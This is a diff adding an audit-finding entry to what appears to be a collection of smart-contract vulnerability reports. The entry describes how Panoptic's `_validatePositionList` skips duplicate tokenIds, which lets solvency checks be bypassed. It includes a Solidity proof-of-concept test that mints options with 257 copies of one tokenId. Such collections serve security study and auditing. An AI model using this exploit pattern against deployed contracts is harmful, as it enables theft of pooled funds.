@@ -1941,3 +1941,55 @@ Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining
 ```
 
 </details>
+
+## 18.[Medium] `_validatePositionList()` does not check for duplicate tokenIds, allowing attackers to bypass solvency checks
+
+### Bypass solvency checks
+
+- Summary: The `_validatePositionList` function in the `PanopticPool` contract does not check for duplicate `tokenIds`, allowing attackers to bypass solvency checks. This results in potential insolvency issues.
+
+- Impact & Recommendation: Add a check in `_validatePositionList` to ensure the length is shorter than `MAX_POSITIONS` .
+  <br> 🐬: [Source](https://code4rena.com/reports/2024-04-panoptic#m-02-_validatepositionlist-does-not-check-for-duplicate-tokenids-allowing-attackers-to-bypass-solvency-checks) & [Report](https://code4rena.com/reports/2024-04-panoptic)
+
+<details><summary>POC</summary>
+
+```solidity
+
+    function test_duplicatePositionHash(
+        uint256 x,
+        uint256[2] memory widthSeeds,
+        int256[2] memory strikeSeeds,
+        uint256[2] memory positionSizeSeeds,
+        uint256 swapSizeSeed
+    ) public {
+        _initPool(x);
+        (int24 width, int24 strike) = PositionUtils.getOTMSW(
+            widthSeeds[0],
+            strikeSeeds[0],
+            uint24(tickSpacing),
+            currentTick,
+            0
+        );
+        (int24 width2, int24 strike2) = PositionUtils.getOTMSW(
+            widthSeeds[1],
+            strikeSeeds[1],
+            uint24(tickSpacing),
+            currentTick,
+            0
+        );
+        vm.assume(width2 != width || strike2 != strike);
+        populatePositionData([width, width2], [strike, strike2], positionSizeSeeds);
+        // leg 1
+        TokenId tokenId = TokenId.wrap(0).addPoolId(poolId).addLeg(
+            0, 1, isWETH, 0, 0, 0, strike, width
+        );
+        TokenId[] memory posIdList = new TokenId[](257);
+        for (uint i = 0; i < 257; ++i) {
+            posIdList[i] = tokenId;
+        }
+        pp.mintOptions(posIdList, positionSizes[0], 0, 0, 0);
+    }
+
+```
+
+</details>
